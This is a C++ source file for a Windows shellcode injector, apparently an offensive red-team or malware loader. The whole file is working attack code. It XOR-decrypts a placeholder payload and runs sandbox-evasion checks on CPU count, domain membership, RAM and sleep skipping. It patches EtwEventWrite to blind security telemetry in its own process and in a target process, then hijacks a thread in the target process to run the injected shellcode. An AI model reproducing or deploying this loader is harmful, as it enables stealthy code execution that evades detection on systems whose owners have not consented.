#include <Windows.h>
#include <iostream>
#include "allcalls.h"
#include "LM.h"
#pragma comment(lib, "netapi32.lib")
#include <TlHelp32.h>

// --- Set Payload ---
unsigned char shellcode[] = "SHELLCODE HERE";  // Input 1

size_t shellcode_len = sizeof(shellcode);
char key[] = "ac"; // Input 2 (XOR Key)

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

void processors() {

	// Check if <X processors
	int minprocs = 2;
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numprocs = sysinfo.dwNumberOfProcessors;
	if (numprocs < minprocs) {
		exit(0);
	}
}

void domainJoined() {

	// Check if domain joined
	PWSTR domainName;
	NETSETUP_JOIN_STATUS status;
	NetGetJoinInformation(NULL, &domainName, &status);
	if (status != NetSetupDomainName) {
		exit(0);
	}
}

void ram() {

	// Check if <X RAM
	MEMORYSTATUSEX totram;
	totram.dwLength = sizeof(totram);
	GlobalMemoryStatusEx(&totram);
	if ((float)totram.ullTotalPhys / 1073741824 < 4) {
		exit(0);
	}
}

void skipSleep() {

	// Check if long sleeps fast forwarded
	ULONGLONG uptimebeforesleep = GetTickCount64();
	LARGE_INTEGER Interval;
	Interval.QuadPart = -900000000;
	NtDelayExecution(FALSE, &Interval);
	ULONGLONG uptimeaftersleep = GetTickCount64();

	// If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
	if (uptimeaftersleep - uptimebeforesleep < 75000) {
		exit(0);
	};
}

void patchETW() {

	HANDLE curproc = GetCurrentProcess();
	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

	// Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

	DWORD oldprotect;
	LPVOID lpBaseAddress = EEWAddress;
	ULONG NewProtection;

	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
	NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

}

void patchETWRemote(HANDLE remoteProc) {

	HANDLE targetProcHandle = remoteProc;

	DWORD oldprotect1;
	ULONG NewProtection1;

	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
	LPVOID lpBaseAddress = EEWAddress;

	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
	NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}

HANDLE getHandle(int processID) {

	HANDLE targetProcHandle;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)processID;
	cid.UniqueThread = 0;

	NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

	return targetProcHandle;

}

void run(HANDLE remoteProc, int processID) {

	HANDLE threadHijack = NULL;
	HANDLE snapshot;
	PVOID remoteBuffer;
	SIZE_T byteswritten = 0;
	ULONG oldprotect = 0;
	THREADENTRY32 threadentry;
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	threadentry.dwSize = sizeof(THREADENTRY32);

	OBJECT_ATTRIBUTES oa2;
	InitializeObjectAttributes(&oa2, NULL, 0, NULL, 0);
	CLIENT_ID cid2;
	cid2.UniqueProcess = 0;

	NtAllocateVirtualMemory(remoteProc, &remoteBuffer, 0, &shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	NtWriteVirtualMemory(remoteProc, remoteBuffer, shellcode, sizeof(shellcode), &byteswritten);
	NtProtectVirtualMemory(remoteProc, &remoteBuffer, &shellcode_len, PAGE_EXECUTE_READ, &oldprotect);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadentry);

	while (Thread32Next(snapshot, &threadentry)) {
		if (threadentry.th32OwnerProcessID == processID) {
			cid2.UniqueThread = (HANDLE)threadentry.th32ThreadID;
			NtOpenThread(&threadHijack, THREAD_ALL_ACCESS, &oa2, &cid2);
			break;
		}
	}

	NtSuspendThread(threadHijack, NULL);

	NtGetContextThread(threadHijack, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	NtSetContextThread(threadHijack, &context);

	NtResumeThread(threadHijack, NULL);

	NtClose(threadHijack);
	NtClose(remoteProc);

}

// --- MAIN ---
int main(int argc, char** argv) {

	char* holderID = argv[1];
	int PID = atoi(holderID);

	HANDLE target = getHandle(PID);

	patchETW();
	patchETWRemote(target);
	processors();
	domainJoined();
	ram();
	skipSleep();
	run(target, PID);

}
